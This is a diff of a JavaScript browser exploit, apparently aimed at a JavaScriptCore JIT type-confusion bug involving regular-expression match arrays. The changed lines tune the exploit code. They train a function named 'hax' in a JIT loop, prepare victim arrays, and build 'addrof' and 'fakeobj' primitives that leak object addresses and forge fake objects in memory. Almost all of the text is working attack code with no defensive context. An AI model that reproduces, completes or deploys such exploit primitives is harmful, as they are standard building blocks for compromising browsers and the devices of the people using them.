@@ -38,7 +38,7 @@ function gc() {
 //let objX = {objProperty: {fetchme: [1.1]}};
 //let objY = {doublePropety: [2.2]};             // 0x4141414141414141 in memory
 //let target = [1.1,2.2,3.3];
-var objX = {objProperty: {fetchme : 0x1234}};
+var objX = {objProperty: {fetchme : [1.1]}};
 var objY = {doubleProperty: []};
 var victim5 = [1.1, 2.2, 3.3, 4.4, 5.5];
 alert("here1");
@@ -98,7 +98,7 @@ function hax(val) {
   return re;
 }
 for (var i = 0; i < 10000; i++) {
-    hax(i2jsv(0x0108211700001001 + i));
+    hax(i2f(0x0108211700001001 + i));
 }
 // Create an ObjectWithStructure S7 which violates the inferred type of .groups (and potentially
 // other properties) due to createRegExpMatchesArray using putDirect.
@@ -114,11 +114,11 @@ var primitives = {
  addrof: function (obj) {
   hax(backup);
   victim5[0] = obj;
-  hax(i2jsv(0x0108211700001000));
+  hax(i2f(0x0108211700001000));
   return hex(f2i(victim5[2]));
 },
 fakeobj: function (addr) {
-  hax(i2jsv(0x0108211700001000));
+  hax(i2f(0x0108211700001000));
     victim5[2] = addr;
     hax(backup);
   return victim5[0];
